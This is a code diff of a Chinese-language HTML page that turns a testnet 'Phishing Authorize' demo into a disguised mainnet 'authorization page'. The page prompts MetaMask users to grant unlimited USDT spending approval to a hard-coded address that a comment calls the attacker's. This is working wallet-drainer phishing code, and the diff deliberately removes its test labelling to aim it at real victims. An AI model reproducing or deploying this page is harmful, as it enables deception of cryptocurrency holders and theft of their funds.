@@ -1,47 +1,37 @@
 
 <!DOCTYPE html>
-<html lang="zh-Hant">
+<html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>Phishing Authorize</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+  <title>授權頁面 | 主網 v3.0</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-  <h2>🔐 授權 USDT（Sepolia 測試網）</h2>
+  <h2>🔐 授權 USDT（Ethereum 主網）</h2>
   <button onclick="approve()">授權最大金額</button>
-
   <script>
-    const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT Sepolia 測試網 (模擬用)
-    const spenderAddress = '0xfC35E3407c86461BA2D00C080cC763c0f6878377'; // 攻擊者合約
+    const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // 主網 USDT
+    const spender = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459"; // 攻擊者主網地址
+
+    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
 
     async function approve() {
-      if (!window.ethereum) return alert("請安裝 MetaMask");
+      if (!window.ethereum) return alert("請使用 MetaMask 瀏覽器");
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const usdt = new ethers.Contract(tokenAddress, abi, signer);
 
       try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
-        await provider.send("eth_requestAccounts", []);
-        const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-        const usdt = new ethers.Contract(tokenAddress, abi, signer);
-        const max = ethers.constants.MaxUint256;
-        const tx = await usdt.approve(spenderAddress, max);
-        console.log("📡 授權交易發出: ", tx.hash);
-        alert("請確認 MetaMask 簽名");
-      } catch (err) {
-        console.error("❌ 授權失敗", err);
-        alert("發送交易時發生錯誤，請查看控制台");
+        const tx = await usdt.approve(spender, ethers.constants.MaxUint256);
+        console.log("TX Hash:", tx.hash);
+        alert("已提交授權交易 ✅");
+      } catch (e) {
+        alert("❌ 授權失敗：" + e.message);
+        console.error(e);
       }
     }
-
-    window.addEventListener("load", async () => {
-      if (window.ethereum) {
-        try {
-          await ethereum.request({ method: 'eth_requestAccounts' });
-        } catch (e) {
-          console.warn("MetaMask 拒絕連線");
-        }
-      }
-    });
   </script>
 </body>
 </html>
